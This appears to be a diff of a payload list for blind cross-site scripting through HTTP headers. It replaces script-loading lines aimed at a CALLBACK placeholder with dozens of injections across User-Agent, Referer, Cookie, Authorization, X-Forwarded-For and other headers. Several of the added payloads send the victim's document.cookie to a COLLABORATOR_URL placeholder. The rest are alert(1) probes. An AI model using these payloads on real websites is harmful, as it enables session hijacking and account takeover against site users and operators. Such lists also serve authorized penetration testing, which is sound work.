@@ -1,4 +1,37 @@
-User-Agent: "><script src=https://CALLBACK></script>
-X-Forwarded-For: <script src=https://CALLBACK></script>
-Referer: https://CALLBACK
-X-Custom-Header: "><img src=x onerror=import('https://CALLBACK')>
+User-Agent: <script>fetch('http://COLLABORATOR_URL/?c='+document.cookie)</script>
+User-Agent: <img src=x onerror=fetch('http://COLLABORATOR_URL/?c='+document.cookie)>
+User-Agent: <svg onload=fetch('http://COLLABORATOR_URL/?c='+document.cookie)>
+User-Agent: "><script>alert(1)</script>
+User-Agent: "><img src=x onerror=alert(1)>
+Referer: <script>fetch('http://COLLABORATOR_URL/?c='+document.cookie)</script>
+Referer: "><script>alert(1)</script>
+Referer: "><img src=x onerror=alert(1)>
+Referer: javascript:alert(1)
+X-Forwarded-For: <script>fetch('http://COLLABORATOR_URL/?c='+document.cookie)</script>
+X-Forwarded-For: "><script>alert(1)</script>
+X-Forwarded-For: "><img src=x onerror=alert(1)>
+X-Real-IP: <script>alert(1)</script>
+X-Real-IP: "><script>alert(1)</script>
+X-Custom-Header: <script>alert(1)</script>
+X-Custom-Header: "><img src=x onerror=alert(1)>
+Accept-Language: "><script>alert(1)</script>
+Accept-Language: <script>fetch('http://COLLABORATOR_URL/?c='+document.cookie)</script>
+Cookie: session=<script>alert(1)</script>
+Cookie: name="><script>alert(1)</script>
+Cookie: xss=<img src=x onerror=alert(1)>
+Authorization: Bearer <script>alert(1)</script>
+Authorization: Basic "><script>alert(1)</script>
+Content-Type: "><script>alert(1)</script>
+Origin: "><script>alert(1)</script>
+Host: "><script>alert(1)</script>
+X-Auth-Token: <script>alert(1)</script>
+X-Api-Key: <script>alert(1)</script>
+X-Request-ID: <script>alert(1)</script>
+X-Correlation-ID: <script>alert(1)</script>
+CF-Connecting-IP: <script>alert(1)</script>
+True-Client-IP: <script>alert(1)</script>
+X-Originating-IP: <script>alert(1)</script>
+X-Cluster-Client-IP: <script>alert(1)</script>
+Pragma: <script>alert(1)</script>
+Via: <script>alert(1)</script>
+Forwarded: for=<script>alert(1)</script>
